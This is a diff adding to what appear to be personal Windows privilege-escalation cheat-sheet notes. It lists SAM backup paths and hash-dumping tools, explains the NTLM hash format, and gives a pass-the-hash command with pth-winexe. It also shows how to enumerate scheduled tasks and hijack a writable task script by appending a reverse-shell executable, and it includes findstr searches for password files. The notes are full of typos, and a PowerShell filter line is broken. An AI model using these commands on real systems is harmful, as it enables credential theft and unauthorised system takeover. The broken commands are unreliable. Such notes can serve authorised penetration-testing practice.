@@ -233,9 +233,45 @@ Recurisvily searcg files in the CWD with 'pass' or ending in .config
 do the same but contain password and end in .xml .ini .txt 
 - findstr \si password *.xml *.ini *.txt 
 
+--------------------------------------------------
+Useful backup locations 
 
+C:\Windows\Repair 
+C:\Winows\System32\config\RegBack 
+--------------------------------------------------
+SAMDUMP
+PWDUMP
+CREDDUMP7SUITE
+-------------------------------------------------
+Anatomy of the hash
+NTLM STARTS WITH 31D6 USUALLY EMPTY HASH 
+USER:501:LM:NTLM 
+-------------------------------------------------
 
+Logging in with the hash 
+- pth-winexe --system -U "admin%LM:NTLM" //target-ip cmd.exe 
 
+```
+###### Schedualed Tasks
+```
+List all schedualed tasks 
+- schtasks /query /fo LIST /v
+Poweshell
+- Get-ScheduledTask | where ($_.TaskPath -notlike "\Microsoft*") | ft TaskName,TaskPath,State 
+
+Also look for logs that may indicate if any tasks are being run.
+
+Check file permissions on a shecualed task script
+- .\accsschk.exe /accepteula -quv user script.ps1
+
+Back up the original
+
+echo C:\path\to\reverse/exe >> script.ps1 
+
+script will pop shell when the task is complete.
+```
+###### Installed Apps
+```
 ```
 
 ###### Enumerating Unmounted Disks for Windows
